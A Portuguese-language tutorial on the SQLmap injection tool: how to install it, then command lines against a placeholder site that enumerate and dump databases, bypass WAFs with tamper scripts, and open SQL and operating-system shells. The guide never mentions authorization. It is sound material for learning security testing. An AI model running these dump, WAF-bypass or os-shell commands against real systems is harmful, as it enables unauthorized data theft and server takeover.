# SQLmap

## Introdução

SQLmap é uma ferramenta de código aberto usada para automatizar o processo de detecção e exploração de vulnerabilidades de SQL Injection (SQLi) em aplicações web. Ela pode identificar e explorar diferentes tipos de bancos de dados, permitindo a extração de dados, o envio de comandos SQL e até a obtenção de controle completo sobre o servidor. 

## Pré-requisitos

### Hardware
- Computador com conexão à internet.

### Software

- Sistema operacional Linux (ex.: Kali Linux).
- SQLmap instalado.

## Instalação

### Instalação no Kali Linux

No Kali Linux, o SQLmap já vem pré-instalado. Caso não esteja instalado, você pode usar:

```bash
sudo apt-get update
sudo apt-get install sqlmap
```

### Instalação em Outros Sistemas Linux

Em outras distribuições Linux, você pode instalar SQLmap usando pip:

```bash
sudo apt-get update
sudo apt-get install python3-pip
pip3 install sqlmap
```

### Instalação via Git

Para instalar diretamente do repositório Git:

```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
```

## Conceitos Básicos

SQLmap funciona identificando pontos de entrada vulneráveis em aplicações web e automatizando o processo de injeção SQL para extrair informações ou comprometer o banco de dados. Ele suporta uma ampla gama de bancos de dados, como MySQL, PostgreSQL, Oracle, MSSQL, entre outros.

## Comandos Básicos

### Estrutura do Comando

A estrutura básica de um comando SQLmap é:

```bash
sqlmap -u URL [opções]
```

### Parâmetros Comuns

#### -u

Define a URL alvo para a varredura.

```bash
sqlmap -u "http://example.com/index.php?id=1"
```

#### --data

Especifica dados para uma requisição POST.

```bash
sqlmap -u "http://example.com/login.php" --data "username=admin&password=123"
```

#### -p

Especifica o parâmetro a ser testado para SQL Injection.

```bash
sqlmap -u "http://example.com/index.php?id=1" -p id
```

#### --dbs

Enumera os bancos de dados no servidor alvo.

```bash
sqlmap -u "http://example.com/index.php?id=1" --dbs
```

#### --tables

Enumera as tabelas em um banco de dados específico.

```bash
sqlmap -u "http://example.com/index.php?id=1" -D nome_do_banco --tables
```

#### --columns

Enumera as colunas de uma tabela específica.

```bash
sqlmap -u "http://example.com/index.php?id=1" -D nome_do_banco -T nome_da_tabela --columns
```

#### --dump

Extrai o conteúdo de uma tabela específica.

```bash
sqlmap -u "http://example.com/index.php?id=1" -D nome_do_banco -T nome_da_tabela --dump
```

## Fuzzing Avançado e Exploração

### Bypass de WAF (Web Application Firewall)

Para tentar evitar WAFs que podem bloquear injeções SQL:

```bash
sqlmap -u "http://example.com/index.php?id=1" --random-agent --tamper=space2comment
```

### Acesso a Shell no Banco de Dados

SQLmap pode fornecer uma shell interativa no banco de dados para execução de comandos SQL diretamente:

```bash
sqlmap -u "http://example.com/index.php?id=1" --sql-shell
```

### Execução de Comandos no Sistema Operacional

Se o banco de dados permitir, SQLmap pode executar comandos no sistema operacional:

```bash
sqlmap -u "http://example.com/index.php?id=1" --os-shell
```

### Especificando Técnicas de Injeção

SQLmap permite especificar qual técnica de injeção SQL usar, como UNION, BLIND, ERROR, etc.:

```bash
sqlmap -u "http://example.com/index.php?id=1" --technique=U
```

## Automação e Customização

### Uso de Scripts

Você pode automatizar tarefas criando scripts para executar SQLmap com diferentes parâmetros e salvar os resultados para análise posterior.

Exemplo de script em bash:

```bash
#!/bin/bash

TARGET="http://example.com/index.php?id=1"
OUTPUT="/tmp/sqlmap_result.txt"

sqlmap -u $TARGET --dbs --batch > $OUTPUT
```

### Configurações de Proxy

Se você precisar usar SQLmap através de um proxy:

```bash
sqlmap -u "http://example.com/index.php?id=1" --proxy="http://127.0.0.1:8080"
```

### Relatórios

SQLmap pode gerar relatórios detalhados em diferentes formatos (TXT, HTML, XML) para documentação:

```bash
sqlmap -u "http://example.com/index.php?id=1" --output-dir=/tmp/sqlmap_reports
```
